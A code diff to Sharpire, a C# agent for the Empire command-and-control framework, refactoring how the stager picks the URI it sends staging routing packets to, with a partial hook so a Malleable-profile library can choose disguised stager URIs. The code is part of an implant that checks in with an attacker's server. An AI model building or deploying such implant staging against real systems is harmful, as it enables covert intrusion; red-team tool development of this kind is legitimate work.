@@ -136,7 +136,10 @@ namespace Sharpire
         }
     }
 
-    class EmpireStager
+    // Partial so the optional SharpireMalleable source library can extend
+    // PickStagerUri with profile-aware stager URI selection without the base
+    // build referencing any malleable types.
+    partial class EmpireStager
     {
         private SessionInfo sessionInfo;
 
@@ -340,8 +343,7 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
 
-            Random random = new Random();
-            byte[] response = SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            byte[] response = SendData(PickStagerUri(), routingPacket);
 
             RoutingPacket packet = DecodeRoutingPacket(response);
             sessionInfo.SetAgentId(packet.SessionId);
@@ -473,9 +475,30 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentId(), 3, encryptedData);
 
-            Random random = new Random();
-            SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            SendData(PickStagerUri(), routingPacket);
         }
+
+        // Pick the URI to POST stage1 / stage2 routing packets to. When a
+        // malleable profile is in play, the server routes stager POSTs via
+        // profile.stager.client.uris — hitting a task URI (GetTaskUrIs) would
+        // land on profile.post instead and crash the server's extract path.
+        // The SharpireMalleable source library implements
+        // TryPickMalleableStagerUri to set `chosen` from the profile;
+        // otherwise this falls back to the legacy random-task-URI behavior.
+        private string PickStagerUri()
+        {
+            string chosen = null;
+            TryPickMalleableStagerUri(ref chosen);
+            if (chosen != null) return chosen;
+
+            string[] taskUris = sessionInfo.GetTaskUrIs();
+            Random rand = new Random();
+            return taskUris[rand.Next(0, taskUris.Length)];
+        }
+
+        // Hook implemented by SharpireMalleable/Empire.Agent.Malleable.cs when
+        // the malleable source library is compiled in. No-op otherwise.
+        partial void TryPickMalleableStagerUri(ref string chosen);
 
         private void DotNetEmpire()
         {
